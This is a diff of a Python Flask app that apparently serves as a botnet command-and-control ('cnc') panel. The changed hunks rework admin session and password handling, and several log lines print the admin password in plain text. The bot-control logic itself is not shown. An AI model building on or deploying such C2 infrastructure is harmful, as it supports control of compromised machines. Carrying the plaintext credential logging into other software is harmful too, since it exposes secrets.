@@ -94,14 +94,10 @@ def bottoggle():
 
 
 # define the app and some basic values
+
 app = flask.Flask(__name__)
 x = True
 bots = 0
-
-
-# Telnet thread
-def telnetthread():
-  pass
 
 
 # the main page
@@ -128,15 +124,37 @@ def api_check():
     return encode(istoggled, fernetkey)
 
 
-@app.route("/new", methods=["GET"])
-def api_new():
-  adminpass = str("".join(
-    random.choices(string.ascii_lowercase + string.digits, k=7)))
-  with open("html/new.html", "r") as f:
-    html = f.read()
-  return (html.replace("{adminpass}", adminpass)).replace(
-    "{adminpassencrypted}",
-    str((base64.b64encode(adminpass.encode("utf-8")))).replace("=", ""))
+sessionhandle = 0
+
+
+def sessionkill():
+  global sessionhandle
+  sessionhandle = 1
+  print(f"cnc > killed session {adminpass}")
+
+
+@app.route("/session", methods=["GET"])
+def session():
+
+  def errorpage():
+    with open("html/404.html", "r") as f:
+      errorpage = f.read()
+    return errorpage
+
+  if sessionhandle == 0:
+    with open("html/new.html", "r") as f:
+      html = f.read()
+    print(f"cnc > session created with admin password {adminpass}")
+    sessionkill()
+    return html.replace("{adminpass}", adminpass)
+
+  elif sessionhandle == 1:
+    print(f"cnc > session expired with admin password {adminpass}")
+    return errorpage()
+
+  else:
+    print(f"cnc > session error with admin password {adminpass}")
+    return errorpage()
 
 
 # where the bot gets controlled
@@ -187,11 +205,11 @@ def admin():
   if "passwordcheck" in request.args:
     global adminpass
     if request.args["passwordcheck"] == adminpass:
-      print("cnc > Admin authenticated")
+      print(f"cnc > Admin authenticated ({adminpass}")
       return str(
         (base64.b64encode(adminpass.encode("utf-8")))).replace("=", "")
     else:
-      print("cnc > Admin authentication failed")
+      print(f"cnc > Admin authentication failed ({adminpass})")
       return "bad"
   else:
     with open("html/404.html", "r") as f:
